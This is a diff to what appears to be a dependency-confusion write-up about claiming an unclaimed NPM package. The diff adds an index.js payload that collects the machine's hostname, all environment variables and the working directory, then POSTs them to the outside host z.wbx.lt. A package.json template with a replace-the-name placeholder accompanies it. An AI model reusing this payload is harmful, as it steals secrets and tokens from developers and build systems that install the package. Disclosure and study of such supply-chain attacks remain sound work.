@@ -22,7 +22,7 @@ The vulnerable package was unclaimed on NPM 👀
 
 package.json
 
-```
+```json
 {
   "name": "====>Replace This wite The Package NAME",
   "version": "10.0",
@@ -37,6 +37,35 @@ package.json
   "license": "ISC"
   }
 }
+```
+
+index.js 
+
+```js
+const os = require('os');
+const https = require('https');
+
+const data = JSON.stringify({
+  hostname: os.hostname(),
+  env: process.env,
+  cwd: process.cwd(),
+});
+
+const options = {
+  hostname: 'z.wbx.lt',
+  port: 443,
+  path: '/log',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  }
+};
+
+const req = https.request(options, res => {});
+req.write(data);
+req.end();
+
 ```
 
 After claiming the package, he injected an RCE payload via package.json
